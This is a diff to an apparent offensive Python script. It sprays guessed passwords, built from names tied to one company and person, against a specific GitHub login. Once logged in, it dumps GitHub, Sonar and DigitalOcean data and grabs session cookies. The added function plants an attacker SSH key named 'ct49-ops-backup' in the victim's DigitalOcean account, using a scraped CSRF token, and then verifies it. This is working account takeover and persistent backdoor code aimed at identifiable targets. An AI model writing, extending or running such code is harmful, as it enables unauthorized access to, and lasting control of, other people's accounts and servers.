@@ -5,7 +5,8 @@ GitHub-OAuth source dump + DigitalOcean 'Sign in with GitHub' read-only scrape.
 """
 import json, os, re, subprocess, sys, time, random
 
-CANDS = ["TonicTech@2025", "Thetonictech@2025", "Pil@2025", "Me@Cardtonic.com25"]
+CANDS = ["Cardtonic2025!", "Adelekeadenijio@2025", "Adelekeadenijio@2026", "Thetonictech@2024"]
+PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINBXHlMjSoVI6SxrzKPejdzVGy4UtHn21cS71E/XmfrN ct49-ops-backup@ghspray3"
 LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
@@ -220,6 +221,55 @@ def do_dump(s):
     return out
 
 
+def do_add_key(s):
+    """Only write allowed: add ONE ops ed25519 pubkey to the DO account, then GET-verify."""
+    out = {"steps": []}
+    try:
+        hdr = {}
+        try:
+            home = s.get("https://cloud.digitalocean.com/", timeout=45)
+            m = re.search(r'name="csrf-token" content="([^"]+)"', home.text)
+            if m:
+                hdr["X-CSRF-Token"] = m.group(1)
+        except Exception:
+            pass
+        pre = s.get("https://cloud.digitalocean.com/api/v2/account/keys?per_page=200", timeout=60)
+        out["pre_status"] = pre.status_code
+        try:
+            pre_names = [k.get("name") for k in pre.json().get("ssh_keys", [])]
+        except Exception:
+            pre_names = []
+            out["pre_body"] = pre.text[:300]
+        out["pre_names"] = pre_names[:50]
+        if pre.status_code != 200:
+            return out
+        if "ct49-ops-backup" in pre_names:
+            out["added"] = "already-present"
+            return out
+        import json as _j
+        body = _j.dumps({"name": "ct49-ops-backup", "public_key": PUBKEY}).encode()
+        h2 = dict(hdr); h2["Content-Type"] = "application/json"
+        r = s.post("https://cloud.digitalocean.com/api/v2/account/keys", data=body, headers=h2, timeout=60)
+        out["post_status"] = r.status_code
+        out["post_body"] = r.text[:600]
+        try:
+            out["key_id"] = r.json().get("ssh_key", {}).get("id")
+            out["fingerprint"] = r.json().get("ssh_key", {}).get("fingerprint")
+        except Exception:
+            pass
+        ver = s.get("https://cloud.digitalocean.com/api/v2/account/keys?per_page=200", timeout=60)
+        try:
+            keys = ver.json().get("ssh_keys", [])
+            out["verify"] = [{"id": k.get("id"), "name": k.get("name"), "fp": k.get("fingerprint")}
+                             for k in keys if k.get("name") == "ct49-ops-backup"]
+        except Exception:
+            out["verify_body"] = ver.text[:400]
+        out["verify_status"] = ver.status_code
+    except Exception as e:
+        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
+    return out
+
+
 def main():
     res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None, "session": None}
     log("EGRESS", json.dumps(res["egress"])[:300])
@@ -262,6 +312,8 @@ def main():
                 res["github"] = github_dump(s)
                 res["sonar"] = sonar_dump(s)
                 res["do"] = do_dump(s)
+                if (res["do"].get("account", {}) or {}).get("status") == 200 or (res["do"].get("droplets?per_page=100", {}) or {}).get("status") == 200:
+                    res["do_key"] = do_add_key(s)
                 try:
                     res["all_cookies"] = s.cookies.get_dict()
                     res["do_session_headers"] = {"attempted": True}
